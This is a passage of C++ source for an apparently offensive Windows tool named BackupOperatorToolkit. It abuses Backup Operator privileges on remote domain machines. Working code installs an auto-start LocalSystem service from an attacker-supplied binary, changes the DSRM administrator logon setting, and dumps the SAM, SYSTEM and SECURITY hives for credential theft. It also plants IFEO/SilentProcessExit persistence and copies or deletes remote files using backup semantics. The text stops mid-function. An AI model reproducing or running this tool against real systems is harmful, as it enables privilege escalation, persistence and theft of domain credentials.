#include <stdio.h>
#include <iostream>
#include <string>
#include <algorithm>
#include <cctype>
#include <Windows.h>
#include <vector>
#include <Aclapi.h>

LPCSTR mode = NULL;
LPCSTR behaviour = NULL;
LPCSTR dumppath = NULL;
LPCSTR servicepath = NULL;
LPCSTR target = NULL;
LPCSTR servicename = NULL;
LPCSTR displayname = NULL;
LPCSTR description = NULL;
LPCSTR password = NULL;
LPCSTR domain = NULL;
LPCSTR ifeoservice = NULL;
LPCSTR ifeoservicepath = NULL;
DWORD value = NULL;

static std::string FormatErrorMessage(DWORD errorCode) {
	LPSTR buffer = NULL;
	DWORD size = FormatMessageA(
		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		errorCode,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPSTR)&buffer,
		0,
		NULL);

	std::string message;
	if (size == 0 || buffer == NULL) {
		message = "Unknown error";
	}
	else {
		message.assign(buffer, size);
		while (!message.empty() && (message.back() == '\r' || message.back() == '\n')) {
			message.pop_back();
		}
		LocalFree(buffer);
	}

	return message;
}

static std::wstring ConvertToWide(const char* value) {
	if (value == NULL) {
		return std::wstring();
	}

	int required = MultiByteToWideChar(CP_ACP, 0, value, -1, nullptr, 0);
	if (required <= 0) {
		return std::wstring();
	}

	std::wstring wide(static_cast<size_t>(required - 1), L'\0');
	if (!wide.empty()) {
		int converted = MultiByteToWideChar(CP_ACP, 0, value, -1, &wide[0], required);
		if (converted == 0) {
			return std::wstring();
		}
	}
	return wide;
}

static std::wstring BuildExtendedPath(const std::wstring& path) {
	if (path.empty()) {
		return path;
	}

	if (path.rfind(L"\\\\?\\", 0) == 0) {
		return path;
	}

	std::wstring normalized = path;
	for (auto& ch : normalized) {
		if (ch == L'/') {
			ch = L'\\';
		}
	}

	if (normalized.rfind(L"\\\\", 0) == 0) {
		return L"\\\\?\\UNC\\" + normalized.substr(2);
	}

	DWORD required = GetFullPathNameW(normalized.c_str(), 0, NULL, NULL);
	if (required == 0) {
		return normalized;
	}

	std::wstring buffer(static_cast<size_t>(required) + 1, L'\0');
	DWORD written = GetFullPathNameW(normalized.c_str(), static_cast<DWORD>(buffer.size()), &buffer[0], NULL);
	if (written == 0 || written >= static_cast<DWORD>(buffer.size())) {
		return normalized;
	}

	buffer.resize(static_cast<size_t>(written));
	return L"\\\\?\\" + buffer;
}

static bool EnablePrivilege(LPCWSTR privilegeName) {
	HANDLE token = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
		DWORD error = GetLastError();
		std::string message = FormatErrorMessage(error);
		printf("[-] OpenProcessToken failed: %lu - %s\n", error, message.c_str());
		return false;
	}

	LUID luid = {};
	if (!LookupPrivilegeValueW(NULL, privilegeName, &luid)) {
		DWORD error = GetLastError();
		std::string message = FormatErrorMessage(error);
		printf("[-] LookupPrivilegeValueW failed: %lu - %s\n", error, message.c_str());
		CloseHandle(token);
		return false;
	}

	TOKEN_PRIVILEGES privileges = {};
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Luid = luid;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(token, FALSE, &privileges, sizeof(privileges), NULL, NULL)) {
		DWORD error = GetLastError();
		std::string message = FormatErrorMessage(error);
		printf("[-] AdjustTokenPrivileges failed: %lu - %s\n", error, message.c_str());
		CloseHandle(token);
		return false;
	}

	DWORD adjustError = GetLastError();
	CloseHandle(token);
	if (adjustError == ERROR_NOT_ALL_ASSIGNED) {
		printf("[-] Required privilege is not assigned\n");
		return false;
	}

	return true;
}

static std::string NormalizeTargetName(LPCSTR machine) {
	if (machine == NULL) {
		return "";
	}
	std::string normalized = machine;
	while (normalized.rfind("\\\\", 0) == 0) {
		normalized.erase(0, 2);
	}
	return normalized;
}

static bool BuildRemoteUncPath(const std::string& machineName, const std::string& originalPath, std::string& uncPath) {
	if (originalPath.empty()) {
		return false;
	}
	if (originalPath.rfind("\\\\", 0) == 0) {
		uncPath = originalPath;
		std::replace(uncPath.begin(), uncPath.end(), '/', '\\');
		return true;
	}

	if (machineName.empty()) {
		return false;
	}

	if (originalPath.size() > 2 && originalPath[1] == ':' && (originalPath[2] == '\\' || originalPath[2] == '/')) {
		uncPath = "\\\\" + machineName + "\\" + static_cast<char>(toupper(static_cast<unsigned char>(originalPath[0]))) + "$" + originalPath.substr(2);
		std::replace(uncPath.begin(), uncPath.end(), '/', '\\');
		return true;
	}

	return false;
}


void help(){
	printf("Usage: BackupOperatorToolkit.exe SERVICE \\\\PATH\\To\\Service.exe \\\\TARGET.DOMAIN.DK SERVICENAME DISPLAYNAME DESCRIPTION\n");
	printf("Usage: BackupOperatorToolkit.exe DSRM \\\\TARGET.DOMAIN.DK 0||1||2\n");
	printf("Usage: BackupOperatorToolkit.exe DUMP \\\\PATH\\To\\Dump \\\\TARGET.DOMAIN.DK [!] If the dump path is local, the dump will be on the remote computer \n");
	printf("Usage: BackupOperatorToolkit.exe IFEO notepad.exe \\\\Path\\To\\pwn.exe \\\\TARGET.DOMAIN.DK \n");
	printf("Usage: BackupOperatorToolkit.exe COPYREMOTE C:\\LocalPath\\File.txt \\\\TARGET.DOMAIN.COM\\c$\\temp\\");
	printf("Usage: BackupOperatorToolkit.exe COPYLOCAL C:\\LocalPath\\ \\\\TARGET.DOMAIN.COM\\c$\\temp\\file.txt");
	printf("Usage: BackupOperatorToolkit.exe DELREMOTE \\\\TARGET.DOMAIN.COM\\c$\\temp\\file.txt");
	printf("Usage: BackupOperatorToolkit.exe OWNREMOTE \\\\TARGET.DOMAIN.COM\\c$\\temp\\file.txt");
}

void service(){
	HKEY hklm;
	HKEY hkey;
	DWORD result;

	const char* hives[] = { "SYSTEM\\CurrentControlSet\\Services", "SYSTEM\\CurrentControlSet\\Services\\"};

	result = RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != 0) {
		printf("[-] RegConnectRegistryA: %d\n", result);
		exit(0);
	}
	printf("[+] Connecting to Services registry hive\n");
	result = RegOpenKeyExA(hklm, hives[0], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
	if (result != 0) {
		printf("[-] RegOpenKeyExA: %d\n", result);
		exit(0);
	}

	printf("[+] Creating Service key %s\n", servicename);
	DWORD disposition = 0;
	HKEY svckey = NULL;
	result = RegCreateKeyExA(hkey, servicename, NULL, NULL, REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &svckey, &disposition);
	if (result != 0) {
		printf("[-] Service Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service to Auto start\n");
	DWORD dwStart = SERVICE_AUTO_START;
	result = RegSetKeyValueA(svckey, NULL, "Start", REG_DWORD, &dwStart, sizeof(DWORD));
	if (result != 0) {
		printf("[-] Auto Start Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service Type\n");
	DWORD dwType = SERVICE_WIN32_OWN_PROCESS;
	result = RegSetKeyValueA(svckey, NULL, "Type", REG_DWORD, &dwType, sizeof(DWORD));
	if (result != 0) {
		printf("[-] Service Type: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Recovery Action\n");
	DWORD dwErrorControl = 1;
	result = RegSetKeyValueA(svckey, NULL, "ErrorControl", REG_DWORD, &dwErrorControl, sizeof(DWORD));
	if (result != 0) {
		printf("[-] Recovery: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service to run with Local System\n");
	char szObjectName[] = "LocalSystem";
	result = RegSetKeyValueA(svckey, NULL, "ObjectName", REG_SZ, &szObjectName[0], sizeof(szObjectName));
	if (result != 0) {
		printf("[-] Local System Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service DisplayName to %s\n", displayname);
	result = RegSetKeyValueA(svckey, NULL, "DisplayName", REG_SZ, displayname, strlen(displayname) + 1);
	if (result != 0) {
		printf("[-] DisplayName: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service Description to %s\n", description);
	result = RegSetKeyValueA(svckey, NULL, "Description", REG_SZ, description, strlen(description) + 1);
	if (result != 0) {
		printf("[-] Description: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service Path to %s\n", servicepath);
	result = RegSetKeyValueA(svckey, NULL, "ImagePath", REG_EXPAND_SZ, servicepath, strlen(servicepath) + 1);
	if (result != 0) {
		printf("[-] Service Path: %d\n", result);
		exit(0);
	}

	result = RegCloseKey(hkey);
	if (result != 0) {
		printf("[-] RegCloseKey: %d\n", result);
		exit(0);
	}

	printf("\nThe service will be executed when the machine is rebooted.\n");
}

void dsrm() {
	HKEY hklm;
	HKEY hkey;
	DWORD result;

	const char* hives = "SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA";

	result = RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != 0) {
		printf("[-] RegConnectRegistryW: %d\n", result);
		exit(0);
	}

	printf("[+] Opening target hive to write\n");
	result = RegOpenKeyExA(hklm, hives, REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
	if (result != 0) {
		printf("[-] RegOpenKeyExA: %d\n", result);
		exit(0);
	}
	printf("[+] Setting DsrmAdminLogonBehavior value to %lu\n", value);
	result = RegSetValueExA(hkey, "DsrmAdminLogonBehavior", NULL, REG_DWORD, (const BYTE*)&value, sizeof(value));
	if (result != 0) {
		printf("[-] RegSetValueExA: %d\n", result);
		exit(0);
	}
	result = RegCloseKey(hkey);
	if (result != 0) {
		printf("[-] RegCloseKey: %d\n", result);
		exit(0);
	}
	
}

void dump() {
	HKEY hklm;
	HKEY hkey;
	DWORD result;

	const char* hives[] = { "SAM","SYSTEM","SECURITY" };

	if (dumppath == NULL || dumppath[0] == '\0') {
		printf("[-] Dump path is empty. Please supply a valid destination directory.\n");
		exit(0);
	}

	printf("[+] Connecting to %s registry service\n", target ? target : "local");
	result = RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != ERROR_SUCCESS) {
		std::string connectErrorMessage = FormatErrorMessage(result);
		printf("[-] RegConnectRegistryA: %lu - %s\n", result, connectErrorMessage.c_str());
		exit(0);
	}

	std::string normalizedTarget = NormalizeTargetName(target);

	for (int i = 0; i < 3; i++) {
		const char* hiveName = hives[i];
		std::string dumpDirectory = dumppath;
		if (!dumpDirectory.empty()) {
			char last = dumpDirectory.back();
			if (last != '\\' && last != '/') {
				dumpDirectory.push_back('\\');
			}
		}
		std::string hiveFilePath = dumpDirectory + hiveName;
		std::string remoteHiveFilePath;
		bool hasRemotePath = BuildRemoteUncPath(normalizedTarget, hiveFilePath, remoteHiveFilePath);
		const std::string& verificationPath = hasRemotePath ? remoteHiveFilePath : hiveFilePath;

		printf("[+] Connecting to registry hive: %s\n", hiveName);
		result = RegOpenKeyExA(hklm, hiveName, REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
		if (result != ERROR_SUCCESS) {
			std::string openErrorMessage = FormatErrorMessage(result);
			printf("[-] RegOpenKeyExA: %lu (hive: %s) - %s\n", result, hiveName, openErrorMessage.c_str());
			exit(0);
		}

		printf("[+] Dumping hive to %s\n", hiveFilePath.c_str());
		result = RegSaveKeyA(hkey, hiveFilePath.c_str(), NULL);
		if (result != ERROR_SUCCESS) {
			std::string errorMessage = FormatErrorMessage(result);
			printf("[-] RegSaveKeyA: %lu (hive: %s) - %s\n", result, hiveName, errorMessage.c_str());
			exit(0);
		}

		RegCloseKey(hkey);
	}

	RegCloseKey(hklm);
}

void ifeo() {
	HKEY hklm;
	HKEY hkey;
	DWORD result;

	const char* hives[] = { "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\" };
	

	result = RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != 0) {
		printf("[-] RegConnectRegistryW: %d\n", result);
	}

	printf("[+] Connecting to Image File Execution Options registry hive\n");
	result = RegOpenKeyExA(hklm, hives[0], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
	if (result != 0) {
		printf("[-] RegOpenKeyExA: %d\n", result);
		exit(0);
	}

	printf("[+] Creating ifeo process key %s\n", ifeoservice);
	DWORD disposition = 0;
	HKEY ifeokey = NULL;
	result = RegCreateKeyExA(hkey, ifeoservice, NULL, NULL, REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &ifeokey, &disposition);
	if (result != 0) {
		printf("[-] Process Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting GlobalFlag\n");
	DWORD value = 512;
	LPCSTR Global = "GlobalFlag";
	result = RegSetKeyValueA(ifeokey, NULL, Global, REG_DWORD, (LPBYTE)&value, sizeof(value));
	if (result != 0) {
		printf("[-] GlobalFlag: %d\n", result);
		exit(0);
	}

	printf("[+] Connecting to SilentProcessExit registry hive\n");
	result = RegOpenKeyExA(hklm, hives[1], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
	if (result != 0) {
		printf("[-] RegOpenKeyExA: %d\n", result);
		exit(0);
	}

	printf("[+] Creating ifeo process key %s\n", ifeoservice);
	result = RegCreateKeyExA(hkey, ifeoservice, NULL, NULL, REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &ifeokey, &disposition);
	if (result != 0) {
		printf("[-] Process Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting ReportingMode\n");
	DWORD ReportingMode = 1;
	result = RegSetKeyValueA(ifeokey, NULL, "ReportingMode", REG_DWORD, (LPBYTE)&ReportingMode, sizeof(ReportingMode));
	if (result != 0) {
		printf("[-] ReportingMode: %d\n", result);
		exit(0);
	}
	printf("[+] Setting MonitorProcess\n");
	result = RegSetKeyValueA(ifeokey, NULL, "MonitorProcess", REG_SZ, (LPBYTE)ifeoservicepath, strlen(ifeoservicepath));
	if (result != 0) {
		printf("[-] MonitorProcess: %d\n", result);
		exit(0);
	}

	printf("\nThe executable will be run when the specified process is exited.\n");

}

void copyremote(){
	const char* localPath = servicepath;
	const char* remotePath = target;

	if (behaviour && behaviour[0] != '\0') {
		localPath = behaviour;
	}
	if ((remotePath == NULL || remotePath[0] == '\0') && dumppath && dumppath[0] != '\0') {
		remotePath = dumppath;
	}

	if (localPath == NULL || localPath[0] == '\0') {
		printf("[-] Local file path is missing.\n");
		return;
	}

	if (remotePath == NULL || remotePath[0] == '\0') {
		printf("[-] Remote file path is missing.\n");
		return;
	}

	if (!EnablePrivilege(SE_BACKUP_NAME)) {
		printf("[-] Unable to enable SeBackupPrivilege.\n");
		return;
	}

	if (!EnablePrivilege(SE_RESTORE_NAME)) {
		printf("[-] Unable to enable SeRestorePrivilege.\n");
		return;
	}

	std::wstring localPathW = ConvertToWide(localPath);
	if (localPathW.empty()) {
		printf("[-] Failed to convert local path to wide string.\n");
		return;
	}

	std::wstring remotePathW = ConvertToWide(remotePath);
	if (remotePathW.empty()) {
		printf("[-] Failed to convert remote path to wide string.\n");
		return;
	}

	std::wstring extendedLocalPath = BuildExtendedPath(localPathW);
	std::wstring extendedRemotePath = BuildExtendedPath(remotePathW);

	HANDLE localFile = CreateFileW(
		extendedLocalPath.c_str(),
		GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS,
		NULL);
	if (localFile == INVALID_HANDLE_VALUE) {
		DWORD error = GetLastError();
		std::string message = FormatErrorMessage(error);
		printf("[-] CreateFileW (local: %s) failed: %lu - %s\n", localPath, error, message.c_str());
		return;
	}

	HANDLE remoteFile = CreateFileW(
		extendedRemotePath.c_str(),
		GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS,
		NULL);
	if (remoteFile == INVALID_HANDLE_VALUE) {
		DWORD error = GetLastError();
		std::string message = FormatErrorMessage(error);
		printf("[-] CreateFileW (remote: %s) failed: %lu - %s\n", remotePath, error, message.c_str());
		CloseHandle(localFile);
		return;
	}

	BYTE buffer[1 << 16];
	DWORD bytesRead = 0;
	DWORD bytesWritten = 0;
	bool success = true;

	while (true) {
		if (!ReadFile(localFile, buffer, sizeof(buffer), &bytesRead, NULL)) {
			DWORD error = GetLastError();
			std::string message = FormatErrorMessage(error);
			printf("[-] ReadFile failed: %lu - %s\n", error, message.c_str());
			success = false;
			break;
		}

		if (bytesRead == 0) {
			break;
		}

		if (!WriteFile(remoteFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
			DWORD error = GetLastError();
			std::string message = FormatErrorMessage(error);
			printf("[-] WriteFile failed: %lu - %s\n", error, message.c_str());
			success = false;
			break;
		}
	}

	if (success) {
		if (!FlushFileBuffers(remoteFile)) {
			DWORD error = GetLastError();
			std::string message = FormatErrorMessage(error);
			printf("[!] FlushFileBuffers reported an error: %lu - %s\n", error, message.c_str());
		}
		else {
			printf("[+] Copied %s to %s using SeRestorePrivilege.\n", localPath, remotePath);
		}
	}

	CloseHandle(remoteFile);
	CloseHandle(localFile);
}

void copylocal(){
	const char* localPath = servicepath;
	const char* remotePath = target;

	if ((remotePath == NULL || remotePath[0] == '\0') && behaviour && behaviour[0] != '\0') {
		remotePath = behaviour;
	}
	if ((localPath == NULL || localPath[0] == '\0') && dumppath && dumppath[0] != '\0') {
		localPath = dumppath;
	}

	if (remotePath == NULL || remotePath[0] == '\0') {
		printf("[-] Remote file path is missing.\n");
		return;
	}

	if (localPath == NULL || localPath[0] == '\0') {
		printf("[-] Local file path is missing.\n");
		return;
	}

	if (!EnablePrivilege(SE_BACKUP_NAME)) {
		printf("[-] Unable to enable SeBackupPrivilege.\n");
		return;
	}

	std::wstring remotePathW = ConvertToWide(remotePath);
	if (remotePathW.empty()) {
		printf("[-] Failed to convert remote path to wide string.\n");
		return;
	}

	std::wstring localPathW = ConvertToWide(localPath);
	if (localPathW.empty()) {
		printf("[-] Failed to convert local path to wide string.\n");
		return;
	}

	std::wstring extendedRemotePath = BuildExtendedPath(remotePathW);
	std::wstring extendedLocalPath = BuildExtendedPath(localPathW);

	auto buildNtPath = [](const std::wstring& extended) -> std::wstring {
		if (extended.empty()) {
			return std::wstring();
		}
		if (extended.rfind(L"\\\\?\\UNC\\", 0) == 0) {
			return L"\\??\\UNC\\" + extended.substr(8);
		}
		if (extended.rfind(L"\\\\?\\", 0) == 0) {
			return L"\\??\\" + extended.substr(4);
		}
		if (extended.rfind(L"\\\\", 0) == 0) {
			return L"\\??\\UNC\\" + extended.substr(2);
		}
		return L"\\??\\" + extended;
	};

	std::wstring remoteNtPath = buildNtPath(extendedRemotePath);
	if (remoteNtPath.empty()) {
		printf("[-] Failed to build NT path for remote file.\n");
		return;
	}

	std::wstring localNtPath = buildNtPath(extendedLocalPath);
	if (localNtPath.empty()) {
		printf("[-] Failed to build NT path for local file.\n");
		return;
	}

	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
	if (ntdll == NULL) {
		ntdll = LoadLibraryW(L"ntdll.dll");
	}
	if (ntdll == NULL) {
		DWORD error = GetLastError();
		std::string message = FormatErrorMessage(error);
		printf("[-] Failed to load ntdll.dll: %lu - %s\n", error, message.c_str());
		return;
	}

#ifndef NTSTATUS
	typedef LONG NTSTATUS;
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040
#endif
#ifndef FILE_OPEN_FOR_BACKUP_INTENT
#define FILE_OPEN_FOR_BACKUP_INTENT 0x00004000
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif
#ifndef FILE_NON_DIRECTORY_FILE
#define FILE_NON_DIRECTORY_FILE 0x00000040
#endif
#ifndef FILE_OPEN
#define FILE_OPEN 0x00000001
#endif
#ifndef FILE_OVERWRITE_IF
#define FILE_OVERWRITE_IF 0x00000005
#endif

	typedef struct _UNICODE_STRING_LOCAL {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR Buffer;
	} UNICODE_STRING_LOCAL, *PUNICODE_STRING_LOCAL;

	typedef struct _OBJECT_ATTRIBUTES_LOCAL {
		ULONG Length;
		HANDLE RootDirectory;
		PUNICODE_STRING_LOCAL ObjectName;
		ULONG Attributes;
		PVOID SecurityDescriptor;
		PVOID SecurityQualityOfService;
	} OBJECT_ATTRIBUTES_LOCAL, *POBJECT_ATTRIBUTES_LOCAL;

	typedef struct _IO_STATUS_BLOCK_LOCAL {
		union {
			NTSTATUS Status;
			PVOID Pointer;
		};
		ULONG_PTR Information;
	} IO_STATUS_BLOCK_LOCAL, *PIO_STATUS_BLOCK_LOCAL;

	typedef NTSTATUS(NTAPI* NtCreateFile_t)(
		PHANDLE,
		ACCESS_MASK,
		POBJECT_ATTRIBUTES_LOCAL,
		PIO_STATUS_BLOCK_LOCAL,
		PLARGE_INTEGER,
		ULONG,
		ULONG,
		ULONG,
		ULONG,
		PVOID,
		ULONG);

	typedef ULONG(NTAPI* RtlNtStatusToDosError_t)(NTSTATUS);

	NtCreateFile_t NtCreateFilePtr = reinterpret_cast<NtCreateFile_t>(GetProcAddress(ntdll, "NtCreateFile"));
	RtlNtStatusToDosError_t RtlNtStatusToDosErrorPtr = reinterpret_cast<RtlNtStatusToDosError_t>(GetProcAddress(ntdll, "RtlNtStatusToDosError"));

	if (NtCreateFilePtr == NULL) {
		printf("[-] NtCreateFile is not available.\n");
		return;
	}

	auto formatStatus = [&](NTSTATUS status) -> std::string {
		if (RtlNtStatusToDosErrorPtr) {
			DWORD winError = RtlNtStatusToDosErrorPtr(status);
			if (winError != 0) {
				return FormatErrorMessage(winError);
			}
		}
		char buffer[32];
		snprintf(buffer, sizeof(buffer), "NTSTATUS 0x%08lx", static_cast<long>(status));
		return std::string(buffer);
	};

	auto initUnicodeString = [](UNICODE_STRING_LOCAL& ustr, const std::wstring& value) {
		size_t byteLength = value.size() * sizeof(wchar_t);
		if (byteLength > 0xFFFF) {
			ustr.Length = 0;
			ustr.MaximumLength = 0;
			ustr.Buffer = nullptr;
			return false;
		}
		ustr.Length = static_cast<USHORT>(byteLength);
		ustr.MaximumLength = static_cast<USHORT>(byteLength);
		ustr.Buffer = const_cast<PWSTR>(value.c_str());
		return true;
	};

	auto initObjectAttributes = [](OBJECT_ATTRIBUTES_LOCAL& attrs, UNICODE_STRING_LOCAL& name) {
		attrs.Length = sizeof(OBJECT_ATTRIBUTES_LOCAL);
		attrs.RootDirectory = NULL;
		attrs.ObjectName = &name;
		attrs.Attributes = OBJ_CASE_INSENSITIVE;
		attrs.SecurityDescriptor = NULL;
		attrs.SecurityQualityOfService = NULL;
	};

	UNICODE_STRING_LOCAL remoteName = {};
	if (!initUnicodeString(remoteName, remoteNtPath)) {
		printf("[-] Remote NT path is too long.\n");
		return;
	}

	UNICODE_STRING_LOCAL localName = {};
	if (!initUnicodeString(localName, localNtPath)) {
		printf("[-] Local NT path is too long.\n");
		return;
	}

	OBJECT_ATTRIBUTES_LOCAL remoteAttributes = {};
	initObjectAttributes(remoteAttributes, remoteName);

	OBJECT_ATTRIBUTES_LOCAL localAttributes = {};
	initObjectAttributes(localAttributes, localName);

	IO_STATUS_BLOCK_LOCAL remoteStatus = {};
	IO_STATUS_BLOCK_LOCAL localStatus = {};

	HANDLE remoteHandle = NULL;
	NTSTATUS status = NtCreateFilePtr(
		&remoteHandle,
		GENERIC_READ | SYNCHRONIZE,
		&remoteAttributes,
		&remoteStatus,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		FILE_OPEN,
		FILE_OPEN_FOR_BACKUP_INTENT | FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
		NULL,
		0);
	if (!NT_SUCCESS(status)) {
		std::string message = formatStatus(status);
		printf("[-] NtCreateFile (remote: %s) failed: %s\n", remotePath, message.c_str());
		return;
	}

	HANDLE localHandle = NULL;
	status = NtCreateFilePtr(
		&localHandle,
		GENERIC_WRITE | SYNCHRONIZE,
		&localAttributes,
		&localStatus,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ,
		FILE_OVERWRITE_IF,
		FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
		NULL,
		0);
	if (!NT_SUCCESS(status)) {
		std::string message = formatStatus(status);
		printf("[-] NtCreateFile (local: %s) failed: %s\n", localPath, message.c_str());
		CloseHandle(remoteHandle);
		return;
	}

	BYTE buffer[1 << 16];
	DWORD bytesRead = 0;
	DWORD bytesWritten = 0;
	bool success = true;

	while (true) {
		if (!ReadFile(remoteHandle, buffer, sizeof(buffer), &bytesRead, NULL)) {
			DWORD error = GetLastError();
			std::string message = FormatErrorMessage(error);
			printf("[-] ReadFile failed: %lu - %s\n", error, message.c_str());
			success = false;
			break;
		}

		if (bytesRead == 0) {
			break;
		}

		if (!WriteFile(localHandle, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
			DWORD error = GetLastError();
			std::string message = FormatErrorMessage(error);
			printf("[-] WriteFile failed: %lu - %s\n", error, message.c_str());
			success = false;
			break;
		}
	}

	if (success) {
		if (!FlushFileBuffers(localHandle)) {
			DWORD error = GetLastError();
			std::string message = FormatErrorMessage(error);
			printf("[!] FlushFileBuffers reported an error: %lu - %s\n", error, message.c_str());
		}
		else {
			printf("[+] Copied %s to %s using SeBackupPrivilege.\n", remotePath, localPath);
		}
	}

	CloseHandle(localHandle);
	CloseHandle(remoteHandle);
}

void delremote(){
	const char* remotePath = target;

	if ((remotePath == NULL || remotePath[0] == '\0') && behaviour && behaviour[0] != '\0') {
		remotePath = behaviour;
	}
	if ((remotePath == NULL || remotePath[0] == '\0') && dumppath && dumppath[0] != '\0') {
		remotePath = dumppath;
	}

	if (remotePath == NULL || remotePath[0] == '\0') {
		printf("[-] Remote file path is missing.\n");
		return;
	}

	if (!EnablePrivilege(SE_RESTORE_NAME)) {
		printf("[-] Unable to enable SeRestorePrivilege.\n");
		return;
	}

	std::wstring remotePathW = ConvertToWide(remotePath);
	if (remotePathW.empty()) {
		printf("[-] Failed to convert remote path to wide string.\n");
		return;
	}

	std::wstring extendedRemotePath = BuildExtendedPath(remotePathW);

	auto buildNtPath = [](const std::wstring& extended) -> std::wstring {
		if (extended.empty()) {
			return std::wstring();
		}
		if (extended.rfind(L"\\\\?\\UNC\\", 0) == 0) {
			return L"\\??\\UNC\\" + extended.substr(8);
		}
		if (extended.rfind(L"\\\\?\\", 0) == 0) {
			return L"\\??\\" + extended.substr(4);
		}
		if (extended.rfind(L"\\\\", 0) == 0) {
			return L"\\??\\UNC\\" + extended.substr(2);
		}
		return L"\\??\\" + extended;
	};

	std::wstring remoteNtPath = buildNtPath(extendedRemotePath);
	if (remoteNtPath.empty()) {
		printf("[-] Failed to build NT path for remote file.\n");
		return;
	}

	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
	if (ntdll == NULL) {
		ntdll = LoadLibraryW(L"ntdll.dll");
	}
	if (ntdll == NULL) {
		DWORD error = GetLastError();
		std::string message = FormatErrorMessage(error);
		printf("[-] Failed to load ntdll.dll: %lu - %s\n", error, message.c_str());
		return;
	}

#ifndef NTSTATUS
	typedef LONG NTSTATUS;
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040
#endif
#ifndef FILE_OPEN_FOR_BACKUP_INTENT
#define FILE_OPEN_FOR_BACKUP_INTENT 0x00004000
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif
#ifndef FILE_NON_DIRECTORY_FILE
#define FILE_NON_DIRECTORY_FILE 0x00000040
#endif
#ifndef FILE_OPEN
#define FILE_OPEN 0x00000001
#endif

	typedef struct _UNICODE_STRING_LOCAL {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR Buffer;
	} UNICODE_STRING_LOCAL, *PUNICODE_STRING_LOCAL;

	typedef struct _OBJECT_ATTRIBUTES_LOCAL {
		ULONG Length;
		HANDLE RootDirectory;
		PUNICODE_STRING_LOCAL ObjectName;
		ULONG Attributes;
		PVOID SecurityDescriptor;
		PVOID SecurityQualityOfService;
	} OBJECT_ATTRIBUTES_LOCAL, *POBJECT_ATTRIBUTES_LOCAL;

	typedef struct _IO_STATUS_BLOCK_LOCAL {
		union {
			NTSTATUS Status;
			PVOID Pointer;
		};
		ULONG_PTR Information;
	} IO_STATUS_BLOCK_LOCAL, *PIO_STATUS_BLOCK_LOCAL;

	typedef NTSTATUS(NTAPI* NtCreateFile_t)(
		PHANDLE,
		ACCESS_MASK,
		POBJECT_ATTRIBUTES_LOCAL,
		PIO_STATUS_BLOCK_LOCAL,
		PLARGE_INTEGER,
		ULONG,
		ULONG,
		ULONG,
		ULONG,
		PVOID,
		ULONG);

	typedef ULONG(NTAPI* RtlNtStatusToDosError_t)(NTSTATUS);

